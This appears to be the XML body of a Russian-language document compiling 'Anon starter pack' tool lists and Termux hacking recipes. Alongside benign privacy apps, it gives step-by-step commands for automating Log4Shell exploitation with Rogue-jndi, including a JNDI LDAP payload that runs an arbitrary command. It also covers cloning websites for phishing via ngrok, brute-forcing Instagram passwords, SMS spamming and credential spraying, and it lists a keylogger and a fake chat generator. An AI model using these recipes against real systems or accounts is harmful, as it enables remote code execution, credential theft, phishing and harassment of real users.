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P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78078" style:font-name-asian="Times New Roman2" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-name-complex="Times New Roman2" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P4"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style>
    <style:style style:name="P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78078"/>
    </style:style>
    <style:style style:name="P6"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7"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8bd66" style:font-name-asian="Times New Roman2" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-name-complex="Times New Roman2" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P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8bd66"/>
    </style:style>
    <style:style style:name="P1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8bd66"/>
    </style:style>
    <style:style style:name="P1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8bd66" style:font-name-asian="Times New Roman2" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-name-complex="Times New Roman2" style:font-size-complex="14pt"/>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0f038" style:font-name-asian="Times New Roman2" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-name-complex="Times New Roman2" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P1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0f038" style:font-name-asian="Times New Roman2" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-name-complex="Times New Roman2" style:font-size-complex="14pt"/>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1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0a9846" style:font-name-asian="Times New Roman2" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-name-complex="Times New Roman2" style:font-size-complex="14pt"/>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a9846"/>
    </style:style>
    <style:style style:name="P1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1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2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style>
    <style:style style:name="P2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3f92c" style:font-name-asian="Times New Roman2" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-name-complex="Times New Roman2" style:font-size-complex="14pt"/>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style>
    <style:style style:name="P2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be592"/>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27"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28"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0be592"/>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0"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fo:break-before="page"/>
    </style:style>
    <style:style style:name="P3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be592"/>
    </style:style>
    <style:style style:name="P3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6"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dca4b"/>
    </style:style>
    <style:style style:name="P3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dca4b"/>
    </style:style>
    <style:style style:name="P3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4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4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4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0dca4b" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P4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0dca4b" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P4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4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0dca4b" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P4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5c754" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P4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5c754" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P4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01138" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P4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01138" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P5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1" fo:font-size="14pt" officeooo:paragraph-rsid="00101138" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P5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03952" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P5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1" fo:font-size="14pt" officeooo:paragraph-rsid="00103952" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P5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1" fo:font-size="14pt" officeooo:paragraph-rsid="00103952" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P54"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03952" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P5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6393c" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P56"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6393c" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P5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8ed2f" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P5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8ed2f" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P5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9960f" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P60"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9960f" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P6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afa29" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P62"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afa29" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P6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b1454" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P64"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b1454" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Times New Roman" fo:font-size="14pt" fo:language="en" fo:country="US" style:font-name-asian="Times New Roman2" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-name-complex="Times New Roman2" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="T3" style:family="text">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T4" style:family="text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Times New Roman" fo:font-size="14pt" fo:language="en" fo:country="US"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T5" style:family="text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Times New Roman" fo:font-size="14pt"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T6" style:family="text">
      <style:text-properties style:font-name="Times New Roman" fo:font-size="14pt" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties style:font-name="Times New Roman1"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Anon</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">starter</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">pack</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">V</text:span><text:span text:style-name="T3">.10.</text:span></text:p>
      <text:p text:style-name="P2">1. Cryptocam - приложение для создания зашифрованных фото и видео. На телефоне такие файлы не откроются, только на ПК после дешифрования. </text:p>
      <text:p text:style-name="P2">4. Element <text:s/>- <text:s/>федеративный мессенджер с поддержкой и синхронизацией чатов E2EE, в том числе групповых. Анонимная регистрация, работает по протоколу Matrix (https://ru.wikipedia.org/wiki/Matrix).</text:p>
      <text:p text:style-name="P2">5. Njalla (https://njal.la/) - анонимный сервис регистрации доменов с использованием криптовалют, созданный основателями торрента The Pirate Bay. Для регистрации достаточно указать email- или jabber-адреc.</text:p>
      <text:p text:style-name="P2">6. Spoof Timezone (https://addons.mozilla.org/en-US/firefox/addon/spoof-timezone/) - плагин для подмены времени под IP вашего прокси.</text:p>
      <text:p text:style-name="P2">7. Hackingtool - комплексный хакерский инструмент, включающий в себя все топовые тулзы с GitHub. Например, WiFi-Pumpkin, Hera Chrome Keylogger (https://github.com/UndeadSec/HeraKeylogger), UFOnet, Xspear и еще десятки других.</text:p>
      <text:p text:style-name="P2">8. <text:s/>Jackett - поисковик торрент файлов, поддерживающий порядка 150 трекеров.</text:p>
      <text:p text:style-name="P2">9. Darik's Boot and Nuke - <text:s/>это полностью бесплатная программа уничтожения данных, которую можно использовать, чтобы полностью стереть все файлы на жестком диске.</text:p>
      <text:p text:style-name="P2">10. Canary Mail - электронная почта c PGP шифрованием.</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P2">Anon starter pack V.6.</text:p>
      <text:p text:style-name="P2">1. Fake Telegram Chat Generator - генератор фейковых переписок в Telegram для IOS и Android (на выбор), также в разделе Social Media можно выбрать FB, Instragram, Twitter и другие соц.сети.</text:p>
      <text:p text:style-name="P2">2, Claws Mail - бесплатный почтовый клиент с открытым исходным кодом, основанный на GTK+. Легок в конфигурировании и многофункционален. Он включен в Gpg4win, набор утилит для шифрования для Windows.</text:p>
      <text:p text:style-name="P3">3. Session - <text:s/>еще один крутой защищённый и анонимный мессенджер. Для регистрации не требуется указывать почту или номер телефона.</text:p>
      <text:p text:style-name="P3">4. NoScript - <text:s/>полностью настраиваемое расширение Firefox для разрешения контента Javascript, Java и Flash только на тех сайтах, которым ты доверяешь.</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">5. Delta Chat - децентрализованный мессенджер поверх электронной почты со сквозным шифрованием.</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T3">7. Panic Button - <text:s/>закрывайте все окна браузера и вкладки в один клик.</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P2">Создаем тысячи Gmail-почт</text:p>
      <text:p text:style-name="P2">Что же эта за фича такая? Дело в том, что точка является уникальным символом в почтовом адресе, т.е. overbafermail@gmail.com и overbafer.mail@gmail.com являются разным адресами, но гугл и различные</text:p>
      <text:p text:style-name="P2">сервисы так не считают и если мы отправим сообщение на console.mail@gmail.com, оно будет переадресовано consolemail.</text:p>
      <text:p text:style-name="P2">То есть гугл не учитывает точку, в качестве уникального символа и переадресовывает сообщение на email без точки.</text:p>
      <text:p text:style-name="P3">Но самому создавать тысячи уникальных символов для почт утомительно, поэтому можно воспользоваться сайтом thebot.net. Чем больше символов в вашем email, тем больше можно создать псевдопочт.</text:p>
      <text:p text:style-name="P3">Запуск:</text:p>
      <text:p text:style-name="P2">python bot.py адрес@почты файл.txt</text:p>
      <text:p text:style-name="P2">https://thebot.net/api/gmail/</text:p>
      <text:p text:style-name="P2">Список некоторых из самых популярных поисковых систем для хакеров/профессионалов, OSINT/кибер-расследователей.</text:p>
      <text:p text:style-name="P2">shodan.io</text:p>
      <text:p text:style-name="P2">http://wigle.net</text:p>
      <text:p text:style-name="P2">http://grep.app</text:p>
      <text:p text:style-name="P2">http://app.binaryedge.io</text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T3">http://onyphe.io</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P2">Подборка Jabber клиентов</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">1. Conversations <text:s/>(https://f-droid.org/en/packages/eu.siacs.conversations/) - <text:s/>популярный клиент для Android юзеров. Сквозное шифрование посредством OMEMO и PGP. Зашифрованные аудио и видео звонки. Лучший вариант для "ведра".</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P2">3. Dino. <text:s/>(https://dino.im/) - десктопный безопасный мессенджер, похожий на CoyIM. OMEMO+PGP.</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">4. Pidgin (https://www.pidgin.im/) - софт для общения, поддерживающий протоколы ICQ, AIM, Google Talk, MSN, Bonjour, XMPP, Yahoo!, IRC и тому подобное. Легенда, все помнят его с RAMP и протокол шифрования OTR, который использовали дилеры для общения. </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P2">Подборка Jabber клиентов. Часть 2. + бонус</text:p>
      <text:p text:style-name="P2">1. MirandaNG (https://miranda-ng.org/ru/downloads/) - еще один мульти-протокольный клиент, поддерживает IRC, XMPP. Прислано подписчиком, напоминает Pidgin.</text:p>
      <text:p text:style-name="P2">2. Kontalk (https://www.kontalk.org/) - открытый исходный код, сквозное шифрование посредством OMEMO+PGP.</text:p>
      <text:p text:style-name="P2">3. Wime (https://whoer.net/ru/jabber_im_client) - XMPP-клиент, бессмертная классика, с OTR шифрованием. От команды whoer.net, добавлены интересные фичи.</text:p>
      <text:p text:style-name="P2">Бонус</text:p>
      <text:p text:style-name="P2">4. 0bin <text:s/>(https://0bin.net/) - <text:s/>неплохой сервис шифрованных записок, напоминает Stronghold Paste, но в клирнете.</text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P2">Hash Droid - Проверяем хэш-сумму файлов на Android</text:p>
      <text:p text:style-name="P2">В одной из статей (https://telegra.ph/Proveryaem-hehsh-summu-fajlov-v-Windows-i-Linux-03-19) мы рассказывали, как проверить хэш-сумму файла на Windows или Linux.</text:p>
      <text:p text:style-name="P2">Это нужно для того, чтобы удостовериться в безопасности файла.</text:p>
      <text:p text:style-name="P2">На этот раз мы это делаем с помощью Android-устройства</text:p>
      <text:p text:style-name="P2">Скачайте Hash Droid из Google Play (https://play.google.com/store/apps/details?id=com.hobbyone.HashDroid), выберите файл и проверьте его хэш-сумму с помощью кнопки "CALCULATE". </text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T3">Готово!</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P2">Отключение входа под root-пользователем</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Прежде чем заблокировать доступ к учетной записи root, убедитесь, что вы создали административную учетную запись, способную использовать команду sudo для получения привилегий пользователя root, с помощью команды useradd, и задайте для этой учетной записи надежный пароль. Флаг -m означает </text:span><text:soft-page-break/><text:span text:style-name="T3">создание домашнего каталога пользователя, а -c позволяет указать комментарий:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">useradd -m -c "Admin User" admin </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">passwd admin</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Блокируем</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">доступ</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">udo nano /etc/passwd</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T3">Замените</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">строку</text:span><text:span text:style-name="T2"> root:x:0:0:root:/root:/bin/bash </text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> root:x:0:0:root:/root:/sbin/nologin</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T3">Лучшие</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">инструменты</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">для</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">охотников</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">за</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">ошибками</text:span><text:span text:style-name="T2">: Amass, Sublister, Gauplus, HTTPX, Gf tool, Kxss, Sqlmap, Commix, Tplmap, HYDRA, John the ripper, <text:s/>Burpsuite, Arjun, Paramspider, NoSQLmap, NMAP, Nikto, FFUF, 403-Bypass, Gobuster</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Автоматизация атаки </text:span><text:span text:style-name="T2">Log</text:span><text:span text:style-name="T3">4</text:span><text:span text:style-name="T2">Shell</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Уязвимость </text:span><text:span text:style-name="T2">log</text:span><text:span text:style-name="T3">4</text:span><text:span text:style-name="T2">shell</text:span><text:span text:style-name="T3"> до сих пор остаётся актуальной и для автоматизированной эксплуатации данной атаки было создано несколько проектов, один из них - </text:span><text:span text:style-name="T2">Rogue</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">jndi</text:span></text:p>
      <text:p text:style-name="P2">Установка:</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veracode</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">research</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">rogue</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">jndi</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">git</text:span></text:p>
      <text:p text:style-name="P2">Устанавливаем необходимые пакеты:</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">apt</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">update</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">apt</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">install</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">maven</text:span></text:p>
      <text:p text:style-name="P4" loext:marker-style-name="T1"><text:span text:style-name="T2">apt</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">install</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">default</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">jdk</text:span></text:p>
      <text:p text:style-name="P2">Переходим в директорию со скачанным репозиторием и компилируем:</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">cd</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">rogue</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">jndi</text:span></text:p>
      <text:p text:style-name="P4" loext:marker-style-name="T1"><text:span text:style-name="T2">mvn</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">package</text:span></text:p>
      <text:p text:style-name="P2">Запуск:</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">java -jar target/RogueJndi-1.1.jar --command "calc.exe"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Вместо </text:span><text:span text:style-name="T2">calc</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">exe</text:span><text:span text:style-name="T3"> можно указать любую другую команду.</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">На экране отобразятся пэйлоады, выбираем </text:span><text:span text:style-name="T2">RemoteReference</text:span><text:span text:style-name="T3">. Это классическая атака через </text:span><text:span text:style-name="T2">JNDI</text:span><text:span text:style-name="T3">, которая ведет к </text:span><text:span text:style-name="T2">RCE</text:span><text:span text:style-name="T3"> через удаленную загрузку классов</text:span></text:p>
      <text:p text:style-name="P2">Указываем адрес в теле нашего пэйлоада:</text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T3">${</text:span><text:span text:style-name="T2">jndi</text:span><text:span text:style-name="T3">:</text:span><text:span text:style-name="T2">ldap</text:span><text:span text:style-name="T3">://127.0.0.1:1389/</text:span><text:span text:style-name="T2">o</text:span><text:span text:style-name="T3">=</text:span><text:span text:style-name="T2">reference</text:span><text:span text:style-name="T3">}</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">#</text:span><text:span text:style-name="T2">Termux</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Клонируем сайт для фишинга в <text:s/>(</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vk</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">styles</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">themes</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">for</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">vkco</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">ceibjdigmfbbgcpkkdpmjokkokklodmc</text:span><text:span text:style-name="T3">?</text:span><text:span text:style-name="T2">hl</text:span><text:span text:style-name="T3">=</text:span><text:span text:style-name="T2">ru</text:span><text:span text:style-name="T3">)</text:span><text:span text:style-name="T2">Termux</text:span><text:span text:style-name="T3">!</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">RevoltShing</text:span><text:span text:style-name="T3"> - инструмент, который позволяет скопировать сайт и поднять его на собственном сервере для фишинговых атак. Установка</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">git clone https://github.com/AngelSecurityTeam/RevoltShing.git</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">cd RevoltShing</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">chmod +x install.sh</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">bash install.sh </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">python Server.py</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">python revoltshing.py</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2">Далее выбираем, какой сайт мы хотим клонировать:</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">edit</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">url</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://сайт.</text:span><text:span text:style-name="T2">ru</text:span></text:p>
      <text:p text:style-name="P2">И куда будет перенаправление после ввода данных:</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">edit url_destination https://сайт.ru</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2">Запускаем:</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">start</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P4" loext:marker-style-name="T1"><text:span text:style-name="T2">NGROK</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">URL</text:span><text:span text:style-name="T3"> - это ссылка, по которой распологается ваш фишинговый сайт.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">#</text:span><text:span text:style-name="T2">Termux</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post</text:span><text:span text:style-name="T3">/444950/ - </text:span><text:span text:style-name="T2">Termux</text:span><text:span text:style-name="T3"> шаг за шагом (Часть 1)</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post</text:span><text:span text:style-name="T3">/445868/ - </text:span><text:span text:style-name="T2">Termux</text:span><text:span text:style-name="T3"> шаг за шагом (Часть 2)</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company</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">vdsina</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">blog</text:span><text:span text:style-name="T3">/521510/ - Смартфон как системный блок</text:span></text:p>
      <text:p text:style-name="P4"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company</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">first</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">blog</text:span><text:span text:style-name="T3">/586910/ - Веб-сервер на старом смартфоне </text:span><text:span text:style-name="T2">Android</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">#Termux</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">#Brutegram (</text:span><text:span text:style-name="T3">подбор</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">пароля</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> instgramm)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Установка</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ apt update &amp;&amp; apt upgrade</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ apt install python python2 git jq</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ pip2 install requests mechanize</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ git clone https://github.com/Err0r-ICA/Brutegram</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ cd Brutegram</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P4" loext:marker-style-name="T1"><text:span text:style-name="T2">$ bash Brutegram</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">#Termux</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">#работает</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">#spymer (sms-spam)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ apt update</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ apt upgrade</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T1"><text:span text:style-name="T2">$ apt install git</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T1"><text:span text:style-name="T2">$ git clone https://github.com/FSystem88/spymer</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ sh ~/spymer/install.sh</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Запуск:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T3">$ </text:span><text:span text:style-name="T2">spymer</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">#</text:span><text:span text:style-name="T2">Termux</text:span></text:p>
      <text:p text:style-name="P2">#работает</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">#</text:span><text:span text:style-name="T2">BruteSpray</text:span><text:span text:style-name="T3"> (принимает результаты сканирования </text:span><text:span text:style-name="T2">nmap</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">GNMAP</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">XML</text:span><text:span text:style-name="T3"> и, задействуя </text:span><text:span text:style-name="T2">Medusa</text:span><text:span text:style-name="T3">, автоматически брут-форсит службы, используя словари со стандартными логинами и паролями).</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Установка:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ apt update</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ apt upgrade</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ git clone https://github.com/x90skysn3k/brutespray</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ cd brutespray</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ pip install -r requirements.txt</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2">Использование:</text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T3">./</text:span><text:span text:style-name="T2">brutespray</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">py</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">h</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">#</text:span><text:span text:style-name="T2">Termux</text:span></text:p>
      <text:p text:style-name="P2">#работает</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">#</text:span><text:span text:style-name="T2">ShortUrl</text:span><text:span text:style-name="T3"> (сокращение длинных ссылок)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">$ </text:span><text:span text:style-name="T2">apt</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">update</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ apt install git -y</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ git clone https://github.com/htr-tech/shorturl</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">$ </text:span><text:span text:style-name="T2">cd</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">shorturl</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">$ </text:span><text:span text:style-name="T2">bash</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">setup</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">sh</text:span></text:p>
      <text:p text:style-name="P2">Команда для быстрой установки:</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ apt update &amp;&amp; apt install git -y &amp;&amp; git clone</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ git clone https://github.com/htr-tech/shorturl &amp;&amp; cd shorturl &amp;&amp; bash setup.sh &amp;&amp; shorturl</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P6">Далее вводим ссылку и ждем результата.</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">#</text:span><text:span text:style-name="T2">Termux</text:span></text:p>
      <text:p text:style-name="P2">#работает</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">#</text:span><text:span text:style-name="T2">Ipcker</text:span><text:span text:style-name="T3"> (инструмент поиска </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3">-адресов.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Получение информации об </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3">-адресе</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Получение информации об </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3">-адресе любого веб-сайта</text:span></text:p>
